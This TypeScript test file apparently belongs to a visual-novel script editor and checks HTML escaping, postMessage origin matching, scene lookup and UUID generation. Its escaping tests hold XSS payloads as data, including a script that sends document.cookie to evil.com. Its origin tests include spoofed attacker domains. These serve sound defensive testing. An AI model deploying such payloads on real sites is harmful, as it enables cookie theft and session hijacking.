import { describe, it, expect } from 'vitest';

describe('Phase 4: Security, Origin & Editor Logic Verification', () => {
  describe('1. HTML Escaping & XSS Sanitization', () => {
    function escapeHtml(str: string): string {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    it('should escape dangerous HTML script and img onerror tags', () => {
      const maliciousInput = '<img src=x onerror=alert(1)>';
      const escaped = escapeHtml(maliciousInput);
      expect(escaped).toBe('&lt;img src=x onerror=alert(1)&gt;');
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('>');
    });

    it('should escape malicious script injection payloads', () => {
      const payload = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
      const escaped = escapeHtml(payload);
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('&lt;/script&gt;');
      expect(escaped).not.toContain('<script>');
    });

    it('should escape quotes and ampersands to prevent attribute injection', () => {
      const payload = '" onfocus="alert(1)" autofocus="';
      const escaped = escapeHtml(payload);
      expect(escaped).toBe('&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;');
    });
  });

  describe('2. PostMessage Allowed Origin Matching', () => {
    const ALLOWED_ORIGIN_REGEX = /^https?:\/\/([a-zA-Z0-9-]+\.)*usercontent-platform\.com(:\d+)?$/;

    it('should accept valid subdomains of usercontent-platform.com', () => {
      expect(ALLOWED_ORIGIN_REGEX.test('https://preview-123.usercontent-platform.com')).toBe(true);
      expect(ALLOWED_ORIGIN_REGEX.test('https://nested.sub.usercontent-platform.com')).toBe(true);
      expect(ALLOWED_ORIGIN_REGEX.test('http://usercontent-platform.com')).toBe(true);
      expect(ALLOWED_ORIGIN_REGEX.test('https://usercontent-platform.com:8080')).toBe(true);
      expect(ALLOWED_ORIGIN_REGEX.test('https://test-abc.usercontent-platform.com:3000')).toBe(true);
    });

    it('should reject malicious origins attempting to spoof usercontent-platform.com', () => {
      // Attack vector: evil domain with suffix
      expect(ALLOWED_ORIGIN_REGEX.test('https://usercontent-platform.com.attacker.com')).toBe(false);
      // Attack vector: prefix spoofing
      expect(ALLOWED_ORIGIN_REGEX.test('https://evilusercontent-platform.com')).toBe(false);
      expect(ALLOWED_ORIGIN_REGEX.test('https://attacker-usercontent-platform.com')).toBe(false);
      // Attack vector: wrong TLD
      expect(ALLOWED_ORIGIN_REGEX.test('https://preview.usercontent-platform.net')).toBe(false);
      // Attack vector: other domains
      expect(ALLOWED_ORIGIN_REGEX.test('https://google.com')).toBe(false);
    });
  });

  describe('3. Go-to-definition regex for VNS scenes', () => {
    function getSceneDefRegex(targetWord: string): RegExp {
      const escapedTarget = targetWord.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      return new RegExp(`^\\s*scene\\s+${escapedTarget}\\s*(\\{|$)`);
    }

    it('should match scene definition with braces', () => {
      const regex = getSceneDefRegex('intro');
      expect(regex.test('scene intro {')).toBe(true);
      expect(regex.test('  scene intro {')).toBe(true);
      expect(regex.test('\tscene   intro {')).toBe(true); // matches multi-whitespace
      expect(regex.test('scene intro{')).toBe(true); // valid without space before brace
      expect(regex.test('other intro {')).toBe(false);
      expect(regex.test('goto intro')).toBe(false); // not a scene definition
    });

    it('should match scene definition without braces (on standalone line)', () => {
      const regex = getSceneDefRegex('intro');
      expect(regex.test('scene intro')).toBe(true);
      expect(regex.test('  scene intro')).toBe(true);
    });

    it('should not false positive match scenes that have the target as a prefix', () => {
      const regex = getSceneDefRegex('intro');
      expect(regex.test('scene introduction {')).toBe(false);
      expect(regex.test('scene intro_2 {')).toBe(false);
    });
  });

  describe('4. UUIDv4 Generation for Postgres Compatibility', () => {
    function generateUUID(): string {
      // RFC 4122 v4 pattern
      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
        const r = (Math.random() * 16) | 0;
        const v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
      });
    }

    it('should generate valid UUIDv4 strings matching standard RFC4122 format', () => {
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
      for (let i = 0; i < 20; i++) {
        const id = generateUUID();
        expect(id).toMatch(uuidRegex);
      }
    });

    it('should generate unique UUIDs', () => {
      const ids = new Set<string>();
      for (let i = 0; i < 50; i++) {
        ids.add(generateUUID());
      }
      expect(ids.size).toBe(50);
    });
  });

  describe('5. AST scenes iteration in Editor Sidebar', () => {
    it('should correctly iterate scenes array and retrieve scene.name', () => {
      const ast = {
        scenes: [
          { name: 'prologue', statements: [] },
          { name: 'chapter1', statements: [] },
          { name: 'epilogue', statements: [] }
        ]
      };

      const sceneNames: string[] = [];
      if (Array.isArray(ast.scenes)) {
        for (const sc of ast.scenes) {
          if (sc && sc.name) {
            sceneNames.push(sc.name);
          }
        }
      }

      // Old buggy Object.entries iteration would produce ["0", "1", "2"]
      expect(sceneNames).toEqual(['prologue', 'chapter1', 'epilogue']);
      expect(sceneNames).not.toContain('0');
      expect(sceneNames).not.toContain('1');
    });
  });
});
